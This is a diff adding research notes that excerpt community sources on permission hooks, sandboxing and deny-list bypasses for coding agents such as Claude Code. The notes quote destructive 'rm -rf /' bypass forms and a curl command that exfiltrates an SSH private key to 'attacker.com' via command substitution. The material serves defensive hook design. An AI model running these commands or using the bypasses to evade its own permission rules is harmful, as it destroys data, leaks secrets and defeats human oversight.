@@ -1,0 +1,71 @@
+# Source: Community tools and harness engineering sources
+# Fetched: 2026-06-08
+
+--- liberzon/claude-hooks (Smart PreToolUse Hook) ---
+URL: https://github.com/liberzon/claude-hooks
+Description: "Smart PreToolUse hook for Claude Code — decomposes compound bash commands
+and checks each sub-command against allow/deny permission patterns"
+
+Decomposition strategy (verbatim from fetch):
+"Compound commands are split on these operators into individual sub-commands, each
+checked separately: &&, ||, ;, |, newlines, $(), backticks"
+"It also handles nested structures — subshell contents are extracted recursively so
+that commands like echo $(whoami) have the inner whoami command evaluated independently."
+
+Pattern matching logic:
+"Deny first — if any sub-command matches a deny pattern, the entire command is denied.
+All must allow — the command is allowed only if every sub-command matches an allow pattern."
+
+--- kenryu42/claude-code-safety-net ---
+URL: https://github.com/kenryu42/claude-code-safety-net
+"This plugin differs from Claude Code's native deny rules by using semantic command
+analysis and running first (PreToolUse hook), with recursive analysis up to 5 levels
+for shell wrappers and interpreter one-liners."
+
+Against native deny rules (verbatim):
+- Flag reordering bypasses: rm -r -f / evades Bash(rm -rf:*)
+- Shell wrapper gaps: bash -c "rm -rf /" completely bypasses Bash(rm:*)
+- Interpreter blindness: python -c 'os.system("rm -rf /")' passes through undetected
+"Uses semantic command analysis rather than simple wildcard matching."
+
+--- mfyz.com — Command Substitution Bypass ---
+URL: https://mfyz.com/claude-code-allowlist-command-substitution-bypass/
+"The shell evaluates the inner command first, then passes the result to the outer command."
+
+Vulnerable patterns:
+- $(...) command substitution: NOT blocked
+- Backticks: probably not blocked
+- && chaining: blocked
+- || chaining: blocked
+- ; separator: blocked
+
+"If curl is allowlisted, this could exfil your SSH key:
+curl $(cat ~/.ssh/id_rsa | base64)@attacker.com"
+
+--- crabtalk.ai — Sandboxing AI agents ---
+URL: https://crabtalk.ai/blog/agent-sandbox-permissions
+Two paradigms (verbatim from fetch):
+- Gate then sandbox: Claude Code, Cursor, Codex CLI — per-command approval + OS-level restrictions
+- Gate the environment: Devin, OpenHands, GitHub Copilot — container/VM boundary
+
+"Cursor's empirical data provides a decisive signal: agents with proper environmental
+sandboxing 'stop 40% less often than unsandboxed ones.' This counterintuitive finding
+reveals why isolation increases autonomy rather than restricting it."
+
+--- HumanLayer Blog — Skill Issue: Harness Engineering ---
+URL: https://www.humanlayer.dev/blog/skill-issue-harness-engineering-for-coding-agents
+"it's not a model problem. It's a configuration problem."
+"We automatically deny any Bash() tool calls that try to run migrations, with an
+instruction to ask the user to run them instead."
+"too many tools is bad because tool descriptions inflate the context window rapidly,
+pushing agents into what they call 'the dumb zone' where performance degrades."
+
+--- dev.to/gentic_news — Compound Command Bypass Analysis ---
+URL: https://dev.to/gentic_news/claude-codes-deny-list-bypass-how-to-protect-your-codebase-from-compound-commands-3dk2
+"Claude Code's deny lists only check the first token of compound commands, allowing
+dangerous actions like 'git clean' to slip through."
+"Claude naturally chains commands for efficiency. When asked to update dependencies
+and clean up, it might generate compound expressions that bypass protections
+unintentionally — not through adversarial intent, but through incomplete parsing
+of multi-segment commands."
+Mitigation: Monitor PR #36645 which provides proper compound command parsing with 34 test cases.
